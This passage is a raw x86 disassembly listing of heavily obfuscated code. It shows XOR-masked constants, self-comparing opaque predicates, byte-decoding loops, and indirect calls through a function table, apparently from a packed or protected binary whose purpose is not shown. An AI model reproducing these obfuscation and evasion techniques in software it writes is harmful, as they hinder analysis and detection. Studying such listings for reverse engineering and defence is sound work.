  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
